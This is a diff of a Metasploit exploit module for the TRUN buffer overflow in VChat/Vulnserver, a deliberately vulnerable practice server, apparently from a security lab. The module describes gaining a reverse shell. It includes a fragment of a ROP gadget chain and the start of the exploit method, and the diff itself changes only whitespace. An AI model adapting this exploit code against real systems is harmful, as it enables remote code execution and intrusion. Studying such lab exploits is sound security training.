@@ -8,17 +8,15 @@
 ##
 # This module exploits the TRUN command of vulnerable chat server
 ##
-
 class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
   Rank = NormalRanking	# Potential impact to the target
-
   include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module
 
   def initialize(info = {})	# i.e. constructor, setting the initial values
     super(update_info(info,
       'Name'           => 'VChat/Vulnserver Buffer Overflow-TRUN command',	# Name of the target
       'Description'    => %q{	# Explaining what the module does
-         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell.
+         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
       },
       'Author'         => [ 'fxw' ],	## Hacker name
       'License'        => MSF_LICENSE,
@@ -26,6 +24,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
         [
           #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
           [ 'URL', 'https://github.com/DaintyJet/VChat_TRUN_ROP' ]
+
         ],
       'Privileged'     => false,
       'DefaultOptions' =>
@@ -88,7 +87,6 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       #[---INFO:pushad:---]
       0x76fdb774,  # PUSHAD # RETN [OLEAUT32.dll] ** REBASED ** ASLR
     ].flatten.pack("V*")
-
     return rop_gadgets
   end
   def exploit	# Actual exploit
